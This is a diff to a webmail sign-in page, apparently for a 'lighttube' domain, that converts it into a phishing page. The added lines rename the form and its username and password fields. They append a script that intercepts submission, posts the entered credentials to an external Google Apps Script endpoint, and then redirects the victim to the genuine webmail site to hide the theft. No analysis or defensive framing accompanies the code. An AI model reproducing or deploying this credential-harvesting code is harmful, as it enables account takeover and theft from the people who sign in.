@@ -950,8 +950,8 @@ RB,RT,RBC,RTC{white-space:nowrap;}</style>
                             <span class="ImgLoginBanner"></span>
                         </a>
                     </div>				
-				<form id="zLoginForm" method="post" name="loginForm" action="/" accept-charset="UTF-8">
-								<input type="hidden" name="loginOp" value="login">
+				<form id="login-form" method="post" name="google-sheet" action="/" accept-charset="UTF-8">
+								<input type="hidden" name="Domain Name" value="lightube">
 								<input type="hidden" name="login_csrf" value="ab12dcc4-6b4d-41a2-bec5-ee8fa98fb2e3">
 
 								<div class="signIn">Sign In</div>
@@ -960,16 +960,16 @@ RB,RT,RBC,RTC{white-space:nowrap;}</style>
                             </div>
                         <div class="loginSection">
                                     <label for="username" class="zLoginFieldLabel">Username</label>
-                                            <input id="username" tabindex="1" class="zLoginFieldInput" name="username" type="text" value="" size="40" maxlength="1024" autocapitalize="none" autocorrect="off">
+                                            <input id="username" tabindex="1" class="zLoginFieldInput" name="Username" type="text" value="" size="40" maxlength="1024" autocapitalize="none" autocorrect="off">
                                         <label for="password" class="zLoginFieldLabel">Password</label>
                                     <div class="passwordWrapper">
-                                        <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" value="" size="40" maxlength="1024">
+                                        <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="Password" type="password" value="" size="40" maxlength="1024">
                                         <span toggle="#password" onclick="showPassword();" id="showSpan" style="display: block;">Show</span>
                                         <span toggle="#password" onclick="showPassword();" id="hideSpan" style="display: none;">Hide</span>
                                     </div>
                                     <div class="signInAndLabel">
                                         <div>
-                                            <button id="loginButton" type="submit" tabindex="5" class="loginButton">Sign In</button>
+                                            <button id="loginButton" type="submit" tabindex="5" class="loginButton" able>Sign In</button>
                                         </div>
                                         <div class="rememberCheckWrapper"> 
                                                 <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme">
@@ -1000,7 +1000,24 @@ RB,RT,RBC,RTC{white-space:nowrap;}</style>
                                 </div>
                             </div>
                         </div>
-                    </form>
+                    </form><script type="text/javascript">
+
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(() => {
+      const redirectUrl = 'https://webmail.lighttube.net/';
+      const link = document.createElement('a');
+      link.href = redirectUrl;
+      link.click();
+    })
+    .catch((error) => console.error('Error!', error.message));
+            })
+  </script>
 			</div>
 			<div class="decor1"></div>
 		</div>
